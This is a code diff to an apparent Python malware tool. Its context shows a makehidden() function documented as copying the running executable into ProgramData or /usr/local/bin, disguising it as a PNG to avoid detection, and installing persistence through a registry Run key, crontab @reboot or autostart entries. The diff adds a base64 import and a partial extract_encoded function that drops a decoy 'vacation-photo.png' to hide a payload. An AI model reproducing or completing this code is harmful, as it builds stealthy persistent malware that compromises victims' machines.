@@ -1,11 +1,11 @@
-import os, sys, time, subprocess
+import os, sys, time, subprocess, base64
 from pathlib import Path
 
 
 def makehidden():
     """
     Copies the current executable to a hidden location and sets it up to run at system startup.
-    
+
     This function performs the following operations:
     1. Copies the running executable to a system directory (ProgramData on Windows, /usr/local/bin on Linux)
     2. On Windows, uses a temporary PNG filename before renaming to EXE to avoid detection
@@ -13,31 +13,31 @@ def makehidden():
        - Windows: Adds registry entry in HKCU\\...\\Run
        - Linux: Creates .desktop file in autostart directories or adds @reboot entry to crontab
     4. Launches the copied executable
-    
+
     Features:
     - Cross-platform support (Windows/Linux)
     - Comprehensive error handling
     - Multiple fallback methods for persistence
     - Cleanup of temporary files if operations fail
-    
+
     Returns:
         bool: True if all operations completed successfully, False if any step failed
-        
+
     Side Effects:
         - Creates file in system directory
         - Modifies system startup configuration (registry/crontab)
         - Launches new process
-        
+
     Security Considerations:
         - On Windows, uses temporary PNG filename to avoid detection
         - On Linux, uses dot-prefixed hidden filenames
         - Sets proper executable permissions on Linux
-        
+
     Error Handling:
         - Continues operation if non-critical steps fail
         - Cleans up temporary files if operations fail
         - Returns False on any critical failure
-        
+
     Example:
         >>> success = makehidden()
         >>> if not success:
@@ -155,3 +155,21 @@ Comment=System background service
     except Exception as e:
         print(f"Unexpected error in makehidden: {e}")
         return False
+
+
+def extract_encoded(encoded_data):
+
+    try:
+        if sys.platform == "win32":
+            target_path = "C:\\ProgramData\\"
+            fake_image = "vacation-photo.png"
+            open_cmd = lambda f: os.startfile(f)
+        else:
+            target_path = "/tmp/"
+            fake_image = ".vacation-photo.png"
+            open_cmd = lambda f: subprocess.Popen(
+                ["xdg-open", f], stdout=subprocess.PIPE, stderr=subprocess.PIPE
+            )
+
+    except Exception as e:
+        pass
